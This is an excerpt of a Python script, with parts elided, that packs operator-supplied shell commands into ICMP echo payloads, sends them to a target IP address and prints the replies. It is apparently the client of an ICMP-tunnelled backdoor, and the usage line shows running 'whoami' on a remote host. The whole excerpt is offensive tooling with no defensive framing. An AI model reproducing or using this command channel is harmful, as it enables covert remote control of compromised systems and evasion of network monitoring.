...
def send_one_ping(rawsocket, dst_addr, icmp_id, icmp_sq, cmd):
    ...
    packet = struct.pack('!BBHHH512s', 8, 0, 0, icmp_id, icmp_sq, cmd)
    chksum=checksum(packet)
    packet = struct.pack('!BBHHH512s', 8, 0, chksum,icmp_id, icmp_sq, cmd)
    send_time = time.time()
...
def ping(dst_addr,timeout=2, count=3, cmd=b"|cmd=|"):
    for i in range(0,count):
        ...
        if time > 0:
            print("{0} {1} {2} {3} {4} {5} {6} {7}".format(time, type, code, checksum, packet_id, sequence, addr, all_icmpHeader[28:]))
        else:
...
if __name__=="__main__":
    if len(sys.argv) < 3:
        benner()
        print("python {0} ip cmd".format(sys.argv[0]))
        print("python {0} 192.168.1.3 whoami".format(sys.argv[0]))
        sys.exit()
    ping("{0}".format(sys.argv[1]),cmd=b"|Rcode|cmd=?%s?|" % sys.argv[2].encode("ascii"))